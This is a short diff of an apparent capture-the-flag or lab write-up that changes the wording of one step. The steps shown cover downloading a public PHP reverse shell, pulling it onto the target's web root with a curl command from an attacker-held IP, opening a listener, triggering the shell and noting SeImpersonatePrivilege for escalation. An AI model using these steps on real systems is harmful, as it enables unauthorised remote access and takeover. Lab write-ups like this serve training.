@@ -205,7 +205,7 @@ Host script results:
 - navigated to <code>https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php</code><br>
 - downloaded <code>php_reverse_shell.php</code><br>
 - updated the IP<br>
-- executed: <code>curl http://xx.xxx.xxx.xx:8000/php_reverse_shell.php -o php_reverse_shell.php</code> in to <code>C:\xampp\htdocs</code><br><br>
+- executed: <code>curl http://xx.xxx.xxx.xx:8000/php_reverse_shell.php -o php_reverse_shell.php</code> within <code>C:\xampp\htdocs</code><br>
 - setup a listener<br>
 - navigated to <code>stealth.com:8443/php_reverse_shell.php</code><br>
 - identified <code>SeImpresonatePrivilege</code> enabled<br>
